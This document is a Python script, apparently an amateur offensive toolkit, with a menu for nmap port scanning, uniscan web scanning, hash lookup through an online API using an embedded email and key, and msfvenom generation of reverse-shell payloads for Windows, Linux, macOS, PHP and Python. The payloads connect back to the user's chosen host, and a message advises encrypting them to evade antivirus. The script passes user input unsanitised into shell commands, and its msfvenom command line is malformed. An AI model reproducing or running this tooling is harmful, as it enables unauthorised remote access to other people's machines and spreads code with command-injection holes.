#!/usr/bin/env python
import nmap as nmap;
import os as os;
import urllib as urllib;
import socket as socket;

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

nm = nmap.PortScanner();

for k in range(100):
  print("");
print(" _______                      .__     __                  __________       .__ ");
print(" \      \ _____   __ __  ____ |  |___/  |_ ___.__.        \______   \ ____ |__|");
print(" /   |   \\__   \ |  |  \/ ___\|  |  \   __<   |  |  ______ |    |  _//  _ \|  |");
print("/    |    \/ __ \|  |  / /_/  >   Y  \  |  \___  | /_____/ |    |   (  <_> )  |");
print("\____|__  (____  /____/\___  /|___|  /__|  / ____|         |______  /\____/|__|");
print("        \/     \/     /_____/      \/      \/                     \/           ");
print("By Eliaz McNaught (https://github.com/GolderPotato) ");
print("");

if(os.geteuid() != 0):
  print(bcolors.FAIL+bcolors.BOLD+"FATAL: script must be run as root !"+bcolors.ENDC);
  for k in range(3):
    print("");
  exit(1);

def menu1():
  print("Enter 0 to go back a menu at any time.");
  print(" 1) IP and port scanning");
  print(" 2) Website vulnerability searching");
  print(" 3) Hash identifying and cracking");
  print(" 4) Remote access tool making");

  result = asknumber();

  if(result == 0):
    exit();
  elif(result == 1):
    menu2();
    return;
  elif(result == 2):
    menu3();
    return;
  elif(result == 3):
    menu4();
    return;
  elif(result == 4):
    menu5();
  else:
    print("Enter a valid option!");
    asknumber();
    menu1();

def menu2():
  print(" Please enter valid ip or ip range (eg. 192.168.1.20 or 192.168.1.*)");
  ip = askstring();
  if(isInt(ip) and int(ip) == 0):
    menu1();
    return;
  menu2_1(ip);

def menu2_1(ip):
  iprange = 255;
  print(" Please enter port range (default 255)"); 
  result = asknumber();
  if(isInt(result)):
    if(int(result) == 0):
      menu2();
      return;
    else:
      iprange = int(result);
  nm.scan(ip, '0-'+str(iprange));
  result = nm.all_hosts();
  for k in range(100):
    print("");
  if(not result):
    print("No hosts were found for ip/ip range"+ip);
  for i, host in enumerate(result):
    print("[+] Host found ! "+host+" Name: "+str(nm[host].hostname())+" TCP ports: "+str(nm[host].all_tcp())+" UDP ports: "+str(nm[host].all_udp()));
  for k in range(3):
    print("");
  menu1();

def menu3():
  print("Please enter valid ip adress of target http server.");
  print("NOTE: if you want to scan the target using a proxy, please refer to the 'uniscan.conf' file from your uniscan installation folder (usually /usr/share/uniscan)");
  target = askstring();
  if(isInt(target) and int(target) == 0):
    menu1();
  os.system("uniscan -qweds -u "+target);
  for k in range(100):
    print("");
  print(bcolors.BOLD+"Uniscan report will be saved in file:///usr/share/uniscan/report/"+target+".html unless your installation folder is not in /usr/share."+bcolors.ENDC);
  menu1();

def menu4():
  print(" Please enter your obtained hash");
  hash = askstring();
  if(isInt(hash) and int(hash) == 0):
    menu1();
    return;
  os.system("hashid "+hash);
  print(" Please enter your hash type");
  type = askstring();
  if(isInt(type) and int(type) == 0):
    menu1();
    return;
  url = "http://md5decrypt.net/Api/api.php?hash="+hash+"&hash_type="+type+"&email=decryptmd5naughtyboi@gmail.com&code=14be1544fc8db371";
  result = urllib.urlopen(url);
  result = result.read();
  for k in range(100):
    print("");
  print("=========================================================================================================");
  if(not result or ": 00" in str(result)):
    print(bcolors.FAIL+bcolors.BOLD+"No results were found for the given hash, please use password cracker like hashcat to crack your password"+bcolors.ENDC);
  else:
    print(bcolors.OKGREEN+bcolors.BOLD+"Password for hash "+hash+" and hash type "+type+" was found !! > "+result+bcolors.ENDC);
  print("=========================================================================================================");
  for k in range(3):
    print("");
  menu1();  

def menu5():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
  s.connect(("8.8.8.8", 80));
  ip = s.getsockname()[0];
  s.close();
  print(" Enter ip adress (found ip: "+ip+", leave blank if correct, but DO enter the ip if you want to use the reverse shell outside your local network)");
  enterip = askstring();
  if(isInt(enterip) and int(ip) == 0):
    menu1();
    return; 
  if(enterip):
    ip = enterip;
  port = 4444;
  print(" Enter the port you want to use (default 4444)");
  enterport = askstring();
  if(isInt(enterport) and int(enterport) == 0):
    menu1();
    return;
  if(enterport):
    port = enterport;
  print("Choose file type:");
  print("1) .exe reverse shell");
  print("2) .py reverse shell");
  print("3) .php reverse shell");
  print("4) .elf reverse shell");
  print("5) .macho reverse shell");
  type = asknumber();
  extension = "";
  payload = "";
  f = "";
  if(type == 0):
    menu1();
  elif(type == 1):
    extension = "exe";
    payload = "windows/meterpreter/reverse_tcp";
    f = "exe";
  elif(type == 2):
    extension = "py";
    payload = "cmd/unix/reverse_python";
    f = "raw";
  elif(type == 3):
    extension = "php";
    payload = "php/meterpreter_reverse_tcp";
    f = "raw";
  elif(type == 4):
    extension = "elf";
    payload = "linux/x86/meterpreter/reverse_tcp";
    f = "elf";
  elif(type == 5):
    extension = "macho";
    payload = "osx/x86/shell_reverse_tcp";
    f = "macho";
  else:
    print("Please enter valid option !");
    menu5();
    return;
  os.system("msfvenom -p "+str(payload)+" LHOST="+str(ip)+"LPORT="+str(port)+" -f "+str(f)+" -o /tmp/shell."+extension);
  print(bcolors.FAIL+bcolors.BOLD+"NOTE: The generated payload is NOT encrypted !! To bypass AV protection, it is recommended using and encrypted payload"+bcolors.ENDC);
  print(bcolors.OKGREEN+bcolors.BOLD+"Payload was save to /tmp/shell."+extension+bcolors.ENDC); 
  print("You can now parse previous arguments into msfconsole to start listening on port"+str(port));
  os.system("gnome-terminal -e 'msfconsole'");
  menu1();

def asknumber():
  result = raw_input("#> ");
  if(result == "q"):
    exit();
  elif(isInt(result)):
    return int(result);
  else:
    print("Please enter valid number");

def askstring():
  result = raw_input("#> ");
  if(result == "q"):
    exit();
  else:
    return result;

def isInt(value):
  try:
    int(value);
    return True;
  except:
    return False;

menu1();
